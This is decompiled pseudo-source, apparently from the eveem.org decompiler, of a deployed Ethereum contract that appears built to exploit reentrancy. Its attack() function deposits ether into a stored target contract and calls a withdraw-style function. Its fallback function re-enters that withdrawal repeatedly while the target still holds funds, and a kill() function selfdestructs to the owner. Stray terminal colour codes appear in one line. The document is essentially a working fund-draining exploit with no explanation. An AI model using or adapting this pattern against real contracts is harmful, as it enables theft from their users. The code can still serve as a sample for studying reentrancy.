# contract source code retrieved from eveem.org
# retrieved on 2019-12-03

#  addr = 0x5cB073d82d28e76d38c21908fcd213C5ceA3A20d 
#  network = mainnet 
#  ver = 26 Apr 2019 
#  problems = {} 

# storage definitions
def storage:
    # storage address 0
    stor0 # mask: a s
    # storage address 1
    unknownf66ad59aAddress # mask: a s
# hash = 0x41c0e1b5
# getter = None
# const = None
# payable = False
def kill(): # not payable
  if mstor0 != caller:
      stop
  [93mselfdestruct([91mstor0[93m)


# hash = 0x9e5faafc
# getter = None
# const = None
# payable = True
def attack() payable: 
  require ext_code.size(munknownf66ad59aAddress)
  call munknownf66ad59aAddress.deposit() with:
     value call.value wei
       gas gas_remaining - 9050 wei
  require ext_call.success
  require ext_code.size(munknownf66ad59aAddress)
  call munknownf66ad59aAddress.0xccd6e5b6 with:
       gas gas_remaining - 50 wei
      args call.value, this.address
  require ext_call.success


# hash = 0xf66ad59a
# getter = ['storage', 160, 0, 1]
# const = None
# payable = False
def unknownf66ad59a(): # not payable
  return munknownf66ad59aAddress


# hash = _fallback()
# getter = None
# const = None
# payable = True
def _fallback() payable: # default function
  if eth.balance(munknownf66ad59aAddress) >= call.value:
      if gas_remaining >= 40000:
          require ext_code.size(munknownf66ad59aAddress)
          call munknownf66ad59aAddress.0xccd6e5b6 with:
               gas gas_remaining - 50 wei
              args call.value, this.address
          require ext_call.success


